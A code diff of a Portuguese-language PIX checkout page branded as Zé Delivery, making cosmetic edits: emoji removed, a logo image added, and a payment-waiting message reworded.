@@ -793,7 +793,6 @@
       <div class="pix-screen" id="pixScreen">
 
         <div class="pix-header-banner">
-          <div class="pix-logo">🏦</div>
           <h3>PIX gerado com sucesso!</h3>
           <p>Escaneie o QR Code ou copie o código abaixo</p>
         </div>
@@ -813,7 +812,7 @@
           <div class="psb-icon">⏳</div>
           <div class="psb-text">
             <strong>Aguardando pagamento...</strong>
-            <span>Assim que confirmarmos, seu pedido é processado na hora</span>
+            <span>Assim que confirmarmos, seu pedido é processado na hora e o quanto antes sairá para entrega</span>
           </div>
         </div>
 
@@ -840,7 +839,7 @@
         </div>
 
         <div class="ze-promo-box">
-          <div class="ze-promo-img">🍺</div>
+          <img src="images/zelogo.png" alt="Zé Delivery">
           <div class="ze-promo-text">
             <strong>Zé Delivery — Entrega oficial</strong>
             <span>Após o pagamento, seu pedido é confirmado e a entrega começa em instantes. Tempo estimado: 15–45 min.</span>
@@ -1620,7 +1619,7 @@
       // Troca telas
       document.getElementById('checkoutFormArea').classList.add('hidden');
       document.getElementById('pixScreen').classList.add('active');
-      document.getElementById('ckTitle').textContent = '💸 Pague com PIX';
+      document.getElementById('ckTitle').textContent = 'Pague com PIX';
 
       // Timer 10 min
       let expLeft = 10 * 60;
